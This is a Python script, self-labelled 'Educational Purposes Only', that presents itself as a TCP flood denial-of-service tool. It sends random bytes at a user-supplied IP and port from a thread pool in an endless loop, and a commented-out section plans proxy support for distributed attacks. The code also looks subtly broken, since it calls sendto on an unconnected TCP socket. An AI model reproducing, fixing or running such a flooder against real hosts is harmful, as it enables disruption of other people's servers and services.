import socket
import sys
from concurrent.futures import Future
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import as_completed
from random import randbytes

# Educational Purposes Only
# Z3NTL3
# TCP Layer 4 Flood for Ipv4's

count = 0
def Usage():
    print(f"""
python3 {__file__} ip port bytes
""")

try:
    websiteHost_or_IP = sys.argv[1]
    portX = int(sys.argv[2])
    bytesX = int(sys.argv[3])
except:
    Usage()
    sys.exit(-1)

# Will implement Proxied L4 DDOS Later
''' 
def Proxies(file = sys.argv[3]):
    if os.path.exists(file):
        with open(file,"r")as file:
            content = file.read().strip(" ").split("\n")
        return content
    else:
        print(f"File \'{file}\' does not exist")
        sys.exit(-1)

def FormatCheck():
    proxys = Proxies()
    err = False
    for prox in proxys:
        if ":" not in prox:
            err = True
            break
    if err:
        print("Please format your proxies like ip:port each line and remove all white spaces")
        sys.exit(-1)
'''
def Flooder(**pHu):
    global count
    try:
        sVar = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sendByte = sVar.sendto(randbytes(bytesX), (pHu['host_ip'],pHu['port']))
        count+=1
        return f"SEND {count} TCP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
    except:
        return f"TCP Flood Failed On {pHu['host_ip']}:{pHu['port']}"
    finally:
        sVar.close()
    
def Main():
    global count
    pool =  ThreadPoolExecutor(max_workers=61)
    while True:
        f = pool.submit(Flooder,host_ip=websiteHost_or_IP,port=portX)
        print(f.result())
        
if __name__ == "__main__":
    Main()
